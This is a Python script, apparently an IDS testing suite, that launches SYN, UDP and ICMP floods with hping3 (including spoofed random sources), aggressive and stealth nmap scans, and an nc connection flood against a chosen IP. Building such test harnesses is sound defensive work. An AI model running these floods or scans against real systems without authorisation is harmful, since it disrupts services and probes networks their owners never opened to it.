#!/usr/bin/env python3
"""
Network Attack Simulator for IDS Testing
Simulates various network attacks to test IDS detection capabilities
"""

import subprocess
import time
import sys
import argparse
from datetime import datetime

class AttackSimulator:
    def __init__(self, target_ip='127.0.0.1'):
        self.target_ip = target_ip
        
    def print_banner(self, attack_name):
        print("\n" + "="*60)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Launching: {attack_name}")
        print("="*60)
    
    def syn_flood_attack(self, port=80, count=500):
        """
        Simulates SYN Flood Attack - floods target with SYN packets
        IDS should detect: High serror_rate, high connection count
        """
        self.print_banner("SYN Flood Attack")
        print(f"Target: {self.target_ip}:{port}")
        print(f"Sending {count} SYN packets...")
        
        try:
            # hping3 SYN flood
            cmd = [
                'sudo', 'hping3',
                '-S',  # SYN flag
                '-p', str(port),
                '--flood',  # Send packets as fast as possible
                '--rand-source',  # Random source IPs
                '-c', str(count),
                self.target_ip
            ]
            
            subprocess.run(cmd, timeout=10)
            print("✓ SYN flood completed")
        except subprocess.TimeoutExpired:
            print("✓ SYN flood completed (timeout)")
        except Exception as e:
            print(f"✗ Error: {e}")
            print("Note: Run with sudo if permission denied")
    
    def port_scan_attack(self, port_range='1-1000'):
        """
        Simulates Port Scanning Attack
        IDS should detect: High dst_host_count, varied services
        """
        self.print_banner("Port Scan Attack (Nmap)")
        print(f"Target: {self.target_ip}")
        print(f"Scanning ports: {port_range}")
        
        try:
            # Fast aggressive scan
            cmd = [
                'nmap',
                '-T5',  # Aggressive timing
                '-p', port_range,
                '--max-retries', '0',
                self.target_ip
            ]
            
            subprocess.run(cmd, timeout=30)
            print("✓ Port scan completed")
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def stealth_scan(self, port_range='20-100'):
        """
        Simulates Stealth Scan (SYN scan)
        IDS should detect: Multiple connection attempts, no completion
        """
        self.print_banner("Stealth SYN Scan")
        print(f"Target: {self.target_ip}")
        print(f"Scanning ports: {port_range}")
        
        try:
            cmd = [
                'sudo', 'nmap',
                '-sS',  # SYN stealth scan
                '-T4',
                '-p', port_range,
                self.target_ip
            ]
            
            subprocess.run(cmd, timeout=20)
            print("✓ Stealth scan completed")
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def udp_flood_attack(self, port=53, count=300):
        """
        Simulates UDP Flood Attack
        IDS should detect: High packet count, protocol type patterns
        """
        self.print_banner("UDP Flood Attack")
        print(f"Target: {self.target_ip}:{port}")
        print(f"Sending {count} UDP packets...")
        
        try:
            cmd = [
                'sudo', 'hping3',
                '--udp',
                '-p', str(port),
                '--flood',
                '-c', str(count),
                self.target_ip
            ]
            
            subprocess.run(cmd, timeout=10)
            print("✓ UDP flood completed")
        except subprocess.TimeoutExpired:
            print("✓ UDP flood completed (timeout)")
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def icmp_flood_attack(self, count=200):
        """
        Simulates ICMP Flood (Ping Flood)
        IDS should detect: High ICMP traffic rate
        """
        self.print_banner("ICMP Flood Attack (Ping Flood)")
        print(f"Target: {self.target_ip}")
        print(f"Sending {count} ICMP packets...")
        
        try:
            cmd = [
                'sudo', 'hping3',
                '--icmp',
                '--flood',
                '-c', str(count),
                self.target_ip
            ]
            
            subprocess.run(cmd, timeout=10)
            print("✓ ICMP flood completed")
        except subprocess.TimeoutExpired:
            print("✓ ICMP flood completed (timeout)")
        except Exception as e:
            print(f"✗ Error: {e}")
    
    def connection_flood(self, port=80, connections=100):
        """
        Simulates connection flood - rapid connection attempts
        IDS should detect: High connection count
        """
        self.print_banner("Connection Flood Attack")
        print(f"Target: {self.target_ip}:{port}")
        print(f"Attempting {connections} rapid connections...")
        
        for i in range(connections):
            try:
                subprocess.run(
                    ['nc', '-zv', '-w', '1', self.target_ip, str(port)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=1
                )
            except:
                pass
            
            if i % 20 == 0:
                print(f"  Progress: {i}/{connections} connections")
        
        print("✓ Connection flood completed")
    
    def run_all_attacks(self):
        """
        Runs all attack simulations in sequence
        """
        print("\n" + "█"*60)
        print("  NETWORK ATTACK SIMULATION - IDS TESTING SUITE")
        print("█"*60)
        print(f"\nTarget System: {self.target_ip}")
        print("Note: Your IDS should be running and capturing traffic")
        print("\nPress Ctrl+C to stop at any time\n")
        
        time.sleep(3)
        
        attacks = [
            ('Port Scan', lambda: self.port_scan_attack('1-100')),
            ('SYN Flood', lambda: self.syn_flood_attack(80, 300)),
            ('Stealth Scan', lambda: self.stealth_scan('20-80')),
            ('UDP Flood', lambda: self.udp_flood_attack(53, 200)),
            ('ICMP Flood', lambda: self.icmp_flood_attack(150)),
            ('Connection Flood', lambda: self.connection_flood(80, 80))
        ]
        
        for attack_name, attack_func in attacks:
            try:
                attack_func()
                time.sleep(2)  # Pause between attacks
            except KeyboardInterrupt:
                print("\n\n[!] Attack simulation stopped by user")
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error in {attack_name}: {e}")
                continue
        
        print("\n" + "█"*60)
        print("  ALL ATTACK SIMULATIONS COMPLETED")
        print("█"*60)
        print("\nCheck your IDS dashboard for detected threats!")
        print("Expected detections: 200-500+ attack packets\n")

def main():
    parser = argparse.ArgumentParser(
        description='Network Attack Simulator for IDS Testing'
    )
    parser.add_argument(
        '-t', '--target',
        default='127.0.0.1',
        help='Target IP address (default: 127.0.0.1)'
    )
    parser.add_argument(
        '-a', '--attack',
        choices=['syn', 'port', 'stealth', 'udp', 'icmp', 'conn', 'all'],
        default='all',
        help='Attack type to simulate (default: all)'
    )
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(args.target)
    
    if args.attack == 'all':
        simulator.run_all_attacks()
    elif args.attack == 'syn':
        simulator.syn_flood_attack()
    elif args.attack == 'port':
        simulator.port_scan_attack()
    elif args.attack == 'stealth':
        simulator.stealth_scan()
    elif args.attack == 'udp':
        simulator.udp_flood_attack()
    elif args.attack == 'icmp':
        simulator.icmp_flood_attack()
    elif args.attack == 'conn':
        simulator.connection_flood()

if __name__ == '__main__':
    main()
